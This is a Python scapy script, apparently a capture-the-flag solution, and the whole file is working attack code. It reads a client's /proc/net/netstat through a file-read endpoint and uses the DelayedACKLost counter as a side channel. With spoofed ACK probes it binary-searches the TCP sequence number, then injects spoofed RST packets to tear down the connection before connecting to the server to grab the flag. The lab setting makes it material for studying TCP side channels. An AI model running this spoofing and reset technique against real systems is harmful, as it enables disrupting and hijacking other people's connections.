from scapy.all import send,IP,TCP
from socket import *
import requests

dal = 0

def get_client_netstat_delayedacklost():
    r = requests.get('http://172.21.0.3:5000/file?name=/proc/net/netstat')
    new_dal = r.text.split('\n')[1].split()[19]
    return int(new_dal)

def binary_search_recursive(start, end):
    global dal
    if start > end:
        # We are near the correct sequence (off by one)
        return start

    mid = (start+end) // 2
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='A',seq=mid)/'A',verbose=False)
    new_dal = get_client_netstat_delayedacklost()

    if new_dal > dal:
        dal = new_dal
        print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3} (increased: sequence number is bigger)".format(mid,new_dal))
        return binary_search_recursive(mid+1, end)
    else:
        print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3} (not increased: sequence number is smaller)".format(mid,new_dal))
        return binary_search_recursive(start, mid-1)

dal = get_client_netstat_delayedacklost()
print("<pre>")
print("[+] DelayedACKLost on client: {} (INIT)".format(dal))

end = 0
x,b = False,False
for seq in range(int(2**32/2**24)):
    # Send a packet for the IPs in question with an "arbitrary" sequence number.
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='A',seq=seq*2**24)/'A',verbose=False)
    # Get the DelayedACKLost counter from the client container.
    new_dal = get_client_netstat_delayedacklost()
    print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3}".format(seq*2**24,new_dal))
    # If the counter increased the sequence number is lower than the current one.
    #   BUT: If you are too close to a counter wrap there seems to be some magic
    #        therefore only break out of this loop if the DelayedACKLost counter
    #        at least increased once (x = True)
    if new_dal > dal:
        x = True
        dal = new_dal
    else:
        if x == True:
            print("[!] DelayedACKLost counter did not increase.")
            end = seq
            b = True
    if b == True:
        break

print("[+] Determined lower bound of sequence number: {}".format((seq-1)*2**24))
print("[+] Determined upper bound of sequence number: {}".format(seq*2**24))
print("[+] Starting divide and conquer in those bounds.")

# Get the approximate sequence number
seqno = binary_search_recursive((seq-1)*2**24,seq*2**24)
print("[+] Sequence number approximately: {}".format(seqno))

# The sequence number is one off from the binary search. So we could just send one RST with seqno+1. We send some more though :)
print("[+] Sending 20 RSTs with increasing sequences just in case...")
for i in range(20):
    # The matching RST packet makes the client break out of his loop and close the socket.
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='R',seq=seqno+i),verbose=False)
print("[!] Connection to server on client should be reset now.")

# This packet triggers a packet from server to client (ACK) that in turn triggers a RST from the
# client to the server by the TCP stack because the client is not listening anymore.
print("[+] Sending a fake packet to the server to trigger a packet to the client and in turn a proper RST from client to server.")
send(IP(src="172.21.0.3",dst="172.21.0.2")/TCP(sport=7775,dport=21587,flags='A',seq=31337)/'A',verbose=False)
print("[!] Connection from client on server should be reset now as well.")

# Now as the server socket is not blocked anymore we can just connect and get the flag. Copied the code from client.py:
print("[+] Connecting to the server to get the flag.")
HOST = '172.21.0.2'
PORT = 21587
BUFSIZ =1024
ADDR = (HOST,PORT)
tcpCliSock = socket(AF_INET,SOCK_STREAM)
tcpCliSock.connect(ADDR)
tcpCliSock.send(b'*ctf')
data1 = tcpCliSock.recv(BUFSIZ)
print("[!] Flag: {}".format(data1.decode('utf-8')))
exit(0)
